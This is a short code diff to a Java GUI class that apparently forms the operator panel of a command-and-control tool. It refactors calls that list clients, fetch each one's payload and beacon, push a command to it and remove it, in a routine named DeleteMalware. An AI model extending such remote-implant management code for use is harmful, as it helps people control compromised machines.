@@ -26,7 +26,7 @@ public class CausionForm extends JFrame {
             public void actionPerformed(ActionEvent e) {
                 try {
                     if(client.equals("a")){
-                        for(String id : apiHandle.findClients(OS).split("\n")){
+                        for(String id : apiHandle.queryBackend("FINDCLIENTS", "", OS).split("\n")){
                             DeleteMalware(id);
                         }
                     }else{
@@ -40,8 +40,8 @@ public class CausionForm extends JFrame {
         });
     }
     private void DeleteMalware(String id) throws IOException, InterruptedException {
-        String payload = apiHandle.GetPayload(id, OS);
-        String beacon = apiHandle.GetBeacon(id, OS);
+        String payload = apiHandle.queryBackend("GETPAYLOAD", id, OS);
+        String beacon = apiHandle.queryBackend("GETBEACON", id, OS);
         String command = "";
         if(payload.equals("None")||beacon.equals("None")){
             new CustomDialog("Couldn't fetch payload or beacon for: "+id, "Something went wrong!", "Warning.png");
@@ -54,6 +54,6 @@ public class CausionForm extends JFrame {
         System.out.println(command);
         apiHandle.Push(command, id, OS);
         Thread.sleep(5000); // Wait for service to get deleted
-        apiHandle.removeClient(id, OS);
+        apiHandle.queryBackend("REMOVECLIENT", id, OS);
     }
 }
